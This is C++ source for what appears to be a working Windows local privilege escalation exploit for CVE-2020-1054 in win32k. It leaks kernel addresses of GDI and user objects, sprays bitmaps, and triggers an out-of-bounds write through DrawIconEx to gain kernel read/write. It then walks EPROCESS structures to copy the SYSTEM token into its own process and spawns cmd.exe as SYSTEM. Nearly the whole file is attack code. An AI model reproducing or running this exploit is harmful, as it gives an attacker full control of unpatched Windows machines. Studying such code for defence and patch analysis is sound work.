#include<Windows.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#pragma once


typedef enum _HANDLE_TYPE
{
	TYPE_FREE = 0,
	TYPE_WINDOW = 1,
	TYPE_MENU = 2,
	TYPE_CURSOR = 3,
	TYPE_SETWINDOWPOS = 4,
	TYPE_HOOK = 5,
	TYPE_CLIPDATA = 6,
	TYPE_CALLPROC = 7,
	TYPE_ACCELTABLE = 8,
	TYPE_DDEACCESS = 9,
	TYPE_DDECONV = 10,
	TYPE_DDEXACT = 11,
	TYPE_MONITOR = 12,
	TYPE_KBDLAYOUT = 13,
	TYPE_KBDFILE = 14,
	TYPE_WINEVENTHOOK = 15,
	TYPE_TIMER = 16,
	TYPE_INPUTCONTEXT = 17,
	TYPE_HIDDATA = 18,
	TYPE_DEVICEINFO = 19,
	TYPE_TOUCHINPUTINFO = 20,
	TYPE_GESTUREINFOOBJ = 21,
	TYPE_CTYPES,
	TYPE_GENERIC = 255
} HANDLE_TYPE, *PHANDLE_TYPE;

typedef struct _GdiCell
{
	PVOID pKernelAddress;
	UINT16 wProcessIdl;
	UINT16 wCount;
	UINT16 wUpper;
	UINT16 uType;
	PVOID pUserAddress;
}GdiCell, *pGdiCell;

typedef struct _HandleEntry
{
	PULONG_PTR phead;
	PULONG_PTR pOwner;
	BYTE	   bType;
	BYTE	   bFlalgs;
	USHORT	   wUniq;
}HandleEntry, *pHandleEntry;

typedef struct _tagServerInfo
{
	ULONG dwSRVIFlags;
	ULONG_PTR cHandleEntries;
	//...
}tagServerInfo, *ptagServerInfo;

typedef struct _tagSharedInfo
{
	ptagServerInfo psi;
	pHandleEntry   aheList;
	//...
}tagSharedInfo, *PtagSharedInfo;

using _xxxHmValidateHandle = PVOID(__fastcall*)(HANDLE hwnd, HANDLE_TYPE handleType);






class leak
{
public:
	leak();
	~leak() {};
	PVOID GetGdiKernelAddress(HANDLE hGdi);											 // RS1之前可用，用于GDI Object
	PVOID GetUserObjectAddressBygSharedInfo(HANDLE hWnd, PULONG_PTR UserAddr);	     // RS2之前可用，用于User Obejct
	_xxxHmValidateHandle HmValidateHandle;				     // RS4之前可用，返回在用户层映射的地址，用于User Object，可以根据heap->pSelf找到内核地址


private:
	void GetGdiSharedHandleTable();
	void Get_gSharedInfo_ulClientDelta();
	void GetXXXHmValidateHandle();

private:
	pGdiCell GdiSharedHandleTable;
	ULONG_PTR g_DeltaDesktopHeap;
	PtagSharedInfo gSharedInfo;

};




leak::leak()
{
	GetXXXHmValidateHandle();
	GetGdiSharedHandleTable();
	Get_gSharedInfo_ulClientDelta();
}

void leak::GetXXXHmValidateHandle()
{

	auto hModule = LoadLibrary(L"user32.dll");
	auto func = GetProcAddress(hModule, "IsMenu");
	for (size_t i = 0; i < 0x1000; i++)
	{
		BYTE* test = (BYTE*)func + i;
		if (*test == 0xE8)
		{
#ifdef _AMD64_
			ULONG_PTR tmp = (ULONG_PTR)((ULONG_PTR) * (PULONG)(test + 1) | 0xffffffff00000000);
#else
			ULONG_PTR tmp = (ULONG_PTR) * (PULONG)(test + 1);
#endif 
			HmValidateHandle = (_xxxHmValidateHandle)(test + tmp + 5);
			break;
		}
	}
	return;
}

void leak::GetGdiSharedHandleTable()
{
	PULONG_PTR teb = (PULONG_PTR)NtCurrentTeb();

#ifdef _AMD64_
	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x60);
	GdiSharedHandleTable = (pGdiCell) * (PULONG_PTR*)((PBYTE)peb + 0xf8);
#else
	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x30);
	GdiSharedHandleTable = (pGdiCell) * (PULONG_PTR*)((PBYTE)peb + 0x94);
#endif

	return;
}

void leak::Get_gSharedInfo_ulClientDelta()
{
	auto pMenu = CreateMenu();

	/* get g_DeltaDesktopHeap */
	ULONG_PTR Teb = (ULONG_PTR)NtCurrentTeb();
#ifdef _AMD64_
	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x800 + 0x28);   //teb->Win32ClientInfo.ulClientDelta
#else
	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x6CC + 0x1C);
#endif 

	auto hModule = GetModuleHandleW(L"user32.dll");
	gSharedInfo = reinterpret_cast<PtagSharedInfo>(GetProcAddress(hModule, "gSharedInfo"));

	DestroyMenu(pMenu);
}

PVOID leak::GetGdiKernelAddress(HANDLE hGdi)
{
	return (GdiSharedHandleTable + LOWORD(hGdi))->pKernelAddress;
}

PVOID  leak::GetUserObjectAddressBygSharedInfo(HANDLE hWnd, PULONG_PTR UserAddr)
{
	PVOID ret = nullptr;
	pHandleEntry tmp = nullptr;

	for (ULONG_PTR i = 0; i < gSharedInfo->psi->cHandleEntries; i++)
	{
		tmp = gSharedInfo->aheList + i;
		HANDLE handle = reinterpret_cast<HANDLE>(tmp->wUniq << 0x10 | i);
		if (handle == hWnd)
		{
			ret = tmp->phead;
			if (UserAddr != NULL)
			{
				*UserAddr = (ULONG_PTR)ret - g_DeltaDesktopHeap;
			}

		}
	}

	return ret;
}

typedef struct _HANDLEENTRY {
	PVOID   phead;
	PVOID   pOwner;
	BYTE    bType;
	BYTE    bFlags;
	WORD    wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD    wRIPFlags;
	WORD    wSRVIFlags;
	WORD    wRIPPID;
	WORD    wRIPError;
	ULONG   cHandleEntries;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO  psi;
	PHANDLEENTRY aheList;
	ULONG        HeEntrySize;
} SHAREDINFO, *PSHAREDINFO;


typedef struct _LARGE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PVOID Buffer;
} LARGE_STRING, *PLARGE_STRING;

typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
} PEB, *PPEB;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _TEB
{
	NT_TIB NtTib;
	PVOID EnvironmentPointer;
	CLIENT_ID ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;
	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;
}TEB, *PTEB;

#define LENGTH_TAGWND 0x128
#define OFFSET_SPWNDPARENT_WIN7 0x58
#define OFFSET_STRNAME_WIN7 0xD8
#define OFFSET_CBWNDEXTRA_WIN7 0xE8
#define OFFSET_APCADDR_WIN7 0x50
#define OFFSET_APCEPROCESS_WIN7 0x20
#define OFFSET_SECTOKEN_WIN7 0x208
#define OFFSET_EPROCESSPID_WIN7 0x180
#define OFFSET_EPROCESSBLINK_WIN7 0x188

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;


typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;

HWND    hwndIcon1 = NULL;
PBYTE   pwndIcon1 = NULL;
PSHAREDINFO gSharedInfo = NULL;
unsigned long long MySecTokenAddr = NULL;
unsigned long long MyEPROCESSAddr = NULL;
unsigned long long SystemSecurityTokenAddr = NULL;

HBITMAP r1[9500] = {};
PVOID kr1[9500] = {};

HBITMAP r2[9500] = {};
PVOID kr2[9500] = {};

HBITMAP hManager;
HBITMAP hWorker;

byte data[0x6fe20] = { 0 };   //某些系统下可能是0x6fe18

byte backupdata[0x6fe20] = { 0 };

void backup()
{
	GetBitmapBits(hManager, sizeof(backupdata), data);
}

void recovery()
{
	SetBitmapBits(hManager, sizeof(backupdata), data);
}

void SetAddress(ULONG64 addr)
{
	memcpy(&data[0x6fe18], &addr, sizeof(ULONG64));
	SetBitmapBits(hManager, sizeof(data), data);
}
LONG WriteVirtual(ULONG64 dest, BYTE* src, DWORD len)
{
	SetAddress(dest);
	return SetBitmapBits(hWorker, len, src);
}
LONG ReadVirtual(ULONG64 src, BYTE* dest, DWORD len)
{
	SetAddress(src);
	return GetBitmapBits(hWorker, len, dest);
}

unsigned long long ReadPtrFromKernelMemory(unsigned long long addr) {
	ULONG64 ptr;
	ReadVirtual(addr, (BYTE*)&ptr, 8);
	return ptr;
}

void WriteKernelMemory(unsigned long long addr, LPWSTR content) {
	WriteVirtual(addr, (BYTE*)content, wcslen(content));
}

static int ReadKernelAddress(UINT64 qwAddress)
{
	ULONG ptr;
	ReadVirtual(qwAddress, (BYTE*)&ptr, 4);
	return ptr;
}

static BOOL xxInitExploitInfo(VOID)
{
	gSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32"), "gSharedInfo");
	return TRUE;
}

static BOOL xxCreateIconWindowEx(VOID)
{
	// icon
	HWND hwnd1 = CreateWindowExW(0,
		L"#32772",
		NULL,
		WS_MINIMIZE | WS_DISABLED,
		0,
		0,
		0,
		0,
		NULL,
		NULL,
		NULL,
		NULL);

	PSERVERINFO  psi = gSharedInfo->psi;
	PHANDLEENTRY phe = gSharedInfo->aheList;

	PBYTE pwnd1 = NULL;
	PBYTE pwnd2 = NULL;

	for (ULONG c = 0; c < psi->cHandleEntries; c++)
	{
		if ((HWND)(c | (((ULONG_PTR)phe[c].wUniq) << 16)) == hwnd1)
		{
			pwnd1 = (PBYTE)phe[c].phead;
			break;
		}
	}

	pwndIcon1 = pwnd1;
	hwndIcon1 = hwnd1;

	printf("[+]WND1: %p\n", pwndIcon1);
	return TRUE;
}

void FindSecurityTokens() {
	unsigned long long pti = (unsigned long long)(&((THRDESKHEAD*)pwndIcon1)->h.pti);
	printf("[*]Searching for current processes EPROCESS structure\n");

	unsigned long long ptiaddress = ReadPtrFromKernelMemory(pti);
	printf("\tptiaddress == %llx\n", ptiaddress);

	unsigned long long threadTagPointer = ReadPtrFromKernelMemory(ptiaddress);
	printf("\ttagTHREAD == %llx\n", threadTagPointer);

	unsigned long long kapcStateAddr = ReadPtrFromKernelMemory(threadTagPointer + OFFSET_APCADDR_WIN7);
	printf("\tkapc_stateAddr == %llx\n", kapcStateAddr);

	MyEPROCESSAddr = ReadPtrFromKernelMemory(kapcStateAddr + OFFSET_APCEPROCESS_WIN7);

	printf("\teprocess addr: 0x%llx\n", MyEPROCESSAddr);

	MySecTokenAddr = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_SECTOKEN_WIN7);
	printf("\tOriginal security token pointer: 0x%llx\n", MySecTokenAddr);

	printf("[*]Searching for SYSTEM security token address\n");

	unsigned long long nextProc = ReadPtrFromKernelMemory(MyEPROCESSAddr + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
	printf("\tNext eprocess address: 0x%llx\n", nextProc);

	unsigned int pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
	printf("\tFound pid: 0x%X\n", pid);

	while (true) {
		nextProc = ReadPtrFromKernelMemory(nextProc + OFFSET_EPROCESSBLINK_WIN7) - OFFSET_EPROCESSBLINK_WIN7;
		printf("\tNext eprocess address: 0x%llx\n", nextProc);

		pid = ReadKernelAddress(nextProc + OFFSET_EPROCESSPID_WIN7);
		printf("\tFound pid: 0x%X\n", pid);
		//Step 9.2
		if (pid == 4) {
			printf("\ttarget process found!\n");
			SystemSecurityTokenAddr = ReadPtrFromKernelMemory(nextProc + OFFSET_SECTOKEN_WIN7);
			break;
		}
	}
}

int main(int argc, char* argv[])
{
	xxInitExploitInfo();
	xxCreateIconWindowEx();

	leak pleak;
	LoadLibrary(L"user32.dll");
	HDC r0 = CreateCompatibleDC(0x0);
	// CPR's original crash code called CreateCompatibleBitmap as follows
	// HBITMAP r1 = CreateCompatibleBitmap(r0, 0x9f42, 0xa);
	// however all following calculations/reversing in this blog will 
	// generally use the below call, unless stated otherwise
	// this only matters if you happen to be following along with WinDbg

	//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x6f000, 0x08);
	int TokenOffset = 0x208;
	int nSelect = 0;
	int nSelectj = 0;
	wchar_t strSysSecToken[5] = { 0x00 };

	for (UINT i = 0; i < 200; i++)
	{
		r2[i] = CreateCompatibleBitmap(r0, 0x51500, 0x100);
		kr2[i] = pleak.GetGdiKernelAddress(r2[i]);
	}

	for (UINT i = 0; i < 200; i++)
	{
		printf("[*]Bitmap KernelAddress:%p\n", kr2[i]);
	}

	for (UINT i = 0; i < 9500; i++)
	{
		r1[i] = CreateCompatibleBitmap(r0, 0x6f000, 0x08);
		kr1[i] = pleak.GetGdiKernelAddress(r1[i]);
	}

	for (UINT i = 0; i < 9500; i++)
	{
		printf("[*]Bitmap KernelAddress:%p\n", kr1[i]);
	}

	for (UINT i = 0; i < 200; i++)
	{
		for (UINT j = 0; j < 9500; j++)
		{
			//https://0xeb-bp.github.io/blog/2020/06/15/cve-2020-1054-analysis.html
			//1.baseSurfOBJ和SURFOBJ1相距0x100000000
			//2.SURFOBJ1,SURFOBJ2,SURFOBJ3相距0x70000
			if ((ULONGLONG)kr2[i] + 0x100000000 == (ULONGLONG)kr1[j] &&
				(ULONGLONG)kr1[j + 1] - (ULONGLONG)kr1[j] == 0x70000 &&
				(ULONGLONG)kr1[j + 2] - (ULONGLONG)kr1[j + 1] == 0x70000)
			{
				nSelect = i;
				nSelectj = j;
			}
		}
	}

	if (nSelect == 0)
		goto _exit;

	SelectObject(r0, r2[nSelect]);
	////DrawIconEx(r0, 0x0, 0x0, (HICON)0x30000010003, 0x0, 0xfffffffffebffffc,
	////    0x0, 0x0, 0x6);

	printf("[+]Ready to POC\n");
	printf("[+]i:%d j:%d\n", nSelect, nSelectj);
	printf("[+]base bitmap:%p\n", kr2[nSelect]);
	printf("[+]bitmap0:%p\n", kr1[nSelectj]);
	printf("[+]bitmap1:%p\n", kr1[nSelectj + 1]);
	printf("[+]bitmap2:%p\n", kr1[nSelectj + 2]);
	getchar();


	//SURFOBJ1经过0xb次循环，写入SURFOBJ1+0x70038(SURFOBJ1+0x70000为SURFOBJ2,0x38为sizlBitmap)
	DrawIconEx(
		// device context
		r0,
		// offset
	   /* 0x8c0, */  // USE FOR POST KB PATCH
		0x900, // USE FOR PRE  KB PATCH
		// iteration count
		0xb,
		// handle
		(HICON)0x40000010003,
		// roughly writes per iteration
		0x0,
		// use to get oob
		0xffe00000,
		0x0,
		NULL,
		// mask
		0x1);

	hManager = r1[nSelectj + 1];
	hWorker = r1[nSelectj + 2];

	//备份，防止蓝屏
	backup();

	FindSecurityTokens();

	strSysSecToken[3] = (SystemSecurityTokenAddr >> 48) & 0xFFFF;
	strSysSecToken[2] = (SystemSecurityTokenAddr >> 32) & 0xFFFF;
	strSysSecToken[1] = (SystemSecurityTokenAddr >> 16) & 0xFFFF;
	strSysSecToken[0] = (SystemSecurityTokenAddr >> 0) & 0xFFFF;
	printf("Security token to steal: 0x%llx\n", SystemSecurityTokenAddr);
	//Step 9.4
	WriteVirtual(MyEPROCESSAddr + TokenOffset, (BYTE*)strSysSecToken, 4);

	printf("SYSTEM please.\n");
	system("cmd.exe");

	//恢复
	recovery();

_exit:
	getchar();
	return 0;
}